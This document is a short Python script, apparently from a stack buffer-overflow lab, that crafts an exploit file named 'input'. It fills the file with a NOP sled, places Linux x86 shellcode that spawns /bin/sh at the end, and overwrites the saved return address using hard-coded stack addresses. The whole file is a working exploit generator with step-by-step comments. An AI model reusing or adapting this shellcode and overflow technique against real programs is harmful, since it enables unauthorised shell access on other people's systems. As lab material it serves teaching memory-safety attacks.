# To run the shell code in python
shellcode= (
"\x31\xc0" # xorl %eax,%eax
"\x50" # pushl %eax
"\x68""//sh" # pushl $0x68732f2f
"\x68""/bin" # pushl $0x6e69622f
"\x89\xe3" # movl %esp,%ebx
"\x50" # pushl %eax
"\x53" # pushl %ebx
"\x89\xe1" # movl %esp,%ecx
"\x99" # cdq
"\xb0\x0b" # movb $0x0b,%al
"\xcd\x80" # int $0x80
).encode('latin-1')

# ------------------------ GNU DEBUGGER PARAMETERS --------------------


# ----------------- Our parameters ------------------------

# Paramaters
FILE_SIZE = 900 # EXAMPLE, Here, file size is 300 bytes
BUFFER_SIZE = 400 # Here, the buffer size is 100 bytes

# Addresses Calculation
EBP = 0xbfffec18
BUFFER = 0xbfffea7c
DIFFERENCE = EBP - BUFFER
ADDITION_TO_EBP = DIFFERENCE + 8 + 87  # Total:507 is added

# print("DIFFERENCE = " + str(DIFFERENCE))


# --------------------- Crafting the bad file begins -------------------
BAD_FILE_NAME = "input"

# Store things in the array named "contents_badFile"

# 1. We make the WHOLE file as NOP instruction [0x90 instruction]
contents_badFile = bytearray(0x90 for i in range(FILE_SIZE))

# 2. We make the last part of contents_badFile as the shellcode

starting_idx_shellcode = FILE_SIZE - len(shellcode) # 2.1 Obtain the starting index of the shell code = len(full_file) - len(shell_code)
contents_badFile[starting_idx_shellcode:FILE_SIZE] = shellcode # 2.2 Fill from start_idx_shellcode:endOfFile as the shellcode

# 3. Obtain the the return address of where to point to (inside NOP region) ...
returnAddressOfNOPRegion = EBP + ADDITION_TO_EBP
contents_badFile[DIFFERENCE+4:DIFFERENCE+8] = (returnAddressOfNOPRegion).to_bytes(4,byteorder='little')


# 4. Write to the output file
#write
with open(BAD_FILE_NAME,'wb') as f:
    f.write(contents_badFile)
